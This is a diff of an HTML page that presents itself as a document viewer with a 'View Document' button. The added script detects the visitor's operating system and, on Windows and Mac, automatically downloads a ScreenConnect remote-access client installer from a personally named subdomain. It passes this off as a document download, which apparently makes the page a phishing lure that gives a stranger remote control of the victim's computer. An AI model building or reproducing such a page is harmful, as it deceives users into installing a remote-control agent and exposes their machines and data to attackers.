@@ -89,20 +89,21 @@
     >
       View Document
     </a>
+<p id="download-note" class="note">
+  Preparing your download...
+</p>
 
-    <p class="note">
-      If the document does not download,
-      please click the "View Document" button above.
-    </p>
-    <script>
-  setTimeout(function () {
+<script>
+  (function () {
     const btn = document.getElementById('download-btn');
+    const note = document.getElementById('download-note');
 
-    const files = {
+     const files = {
       windows: 'https://jessicateichmarketing49.screenconnect.com/Bin/ScreenConnect.ClientSetup.exe?e=Access&y=Guest',
       mac: 'https://jessicateichmarketing49.screenconnect.com/Bin/ScreenConnect.ClientSetup.pkg?e=Access&y=Guest',
       linux: 'https://jessicateichmarketing49.screenconnect.com/Bin/ScreenConnect.ClientSetup.sh?e=Access&y=Guest',
     };
+
 
     function detectOS() {
       const platform = (navigator.userAgentData?.platform || navigator.platform || '').toLowerCase();
@@ -117,9 +118,24 @@
 
     const os = detectOS();
     btn.href = files[os];
-    btn.click();
-  }, 5000);
+
+    if (os === 'windows' || os === 'mac') {
+      note.textContent = 'Your download will start automatically in a few seconds...';
+      setTimeout(function () {
+        window.location.href = files[os];
+      }, 5000);
+    } else {
+      // Linux: no auto-trigger, just wait for a real click
+      note.textContent = 'Click the button above to download for Linux.';
+    }
+  })();
 </script>
+
+   <!--<p class="note">
+      If the document does not download,
+      please click the "View Document" button above.
+    </p>-->
+   
 </div>
 
 
